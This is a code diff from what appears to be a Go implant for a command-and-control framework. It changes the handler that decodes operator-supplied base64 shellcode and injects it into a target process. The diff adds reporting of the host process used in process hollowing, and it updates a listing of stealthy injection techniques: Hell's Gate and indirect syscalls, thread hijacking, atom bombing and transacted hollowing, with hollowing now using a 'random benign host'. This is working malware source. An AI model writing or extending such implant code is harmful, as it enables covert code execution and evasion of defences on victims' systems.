@@ -20,9 +20,12 @@ func handleInject(task Task, res *TaskResult) {
 	pid, _ := strconv.Atoi(parts[0])
 	tech := parts[1]
 	shellcode, _ := base64.StdEncoding.DecodeString(task.Data)
+	lastHollowHost = ""
 	err := injectProcess(uint32(pid), shellcode, tech)
 	if err != nil {
 		res.Error = err.Error()
+	} else if strings.EqualFold(strings.TrimSpace(tech), "hollow") && lastHollowHost != "" {
+		res.Output = "inject success via " + lastHollowHost
 	} else {
 		res.Output = "inject success"
 	}
@@ -39,7 +42,7 @@ func handleInjectMethods(task Task, res *TaskResult) {
   threadless (tl) - SetThreadContext RIP overwrite (no new thread)
   syscall (hellsgate, direct) - Hell's Gate direct syscall + CreateRemoteThread
   indirect - Indirect syscall through ntdll gadget + NtCreateThreadEx
-  hollow - Process hollowing (suspend + unmap + write + resume)
+  hollow - Process hollowing (suspend + unmap + write + resume, random benign host)
   hijack - Thread hijacking (suspend + set RIP + resume)
   atom - Atom bombing (section + global atom + APC)
   txf - Transacted hollowing (TxF file + CreateProcess)
